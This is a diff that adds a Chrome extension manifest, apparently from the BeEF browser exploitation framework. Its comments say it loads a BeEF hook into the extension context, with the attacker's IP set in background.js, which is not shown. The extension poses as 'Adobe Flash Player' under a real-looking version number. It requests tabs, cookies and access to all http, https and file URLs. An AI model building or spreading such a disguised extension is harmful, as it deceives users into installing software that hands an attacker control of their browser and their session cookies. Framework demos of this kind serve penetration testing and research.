@@ -1,0 +1,26 @@
+{
+  // Simple chrome extension 
+  // Just loads beef into the extension context.
+  // 
+  // You may need to set the IP address of the beef hook in background.js
+  // Then you can pack the extension (from within the chrome extensions page) and add the crx file to extensions/demos/html/ 
+
+  "name": "Adobe Flash Player",
+  "version": "11.2.202.235",
+  "description": "Introduces vulnerabilites into web browsers",
+  "background": {
+    "scripts": ["background.js"]
+  },
+  "icons": { 
+    "16": "icon16.png",
+    "48": "icon48.png",
+    "128": "icon128.png" 
+  },
+  "permissions": [
+	"tabs", 
+	"http://*/*", 
+	"https://*/*",
+  "file://*/*",
+  "cookies"
+  ]
+}
